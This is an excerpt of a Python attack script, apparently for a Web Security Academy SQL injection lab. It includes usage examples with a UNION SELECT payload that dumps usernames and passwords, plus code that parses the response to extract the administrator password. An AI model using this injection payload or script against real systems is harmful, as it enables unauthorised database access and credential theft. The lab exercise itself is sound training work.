...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT username,password FROM users--" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT username,password FROM users--" 
...
parser.add_argument('-c', '--command', help='Command to run, Example: \' UNION SELECT username,password FROM users--', required=True)
        ...
        if (r.status_code == 200):
            for line in r.content.splitlines():
                ...
                if (type(res).__name__ == 'Match'):
                    str_res = str(res)
                    pwd = str_res.split("match='")[1]
                    global admin_pwd
                    admin_pwd = pwd.split("'>")[0]
                    return admin_pwd
                else: 
                    pass
        else: 
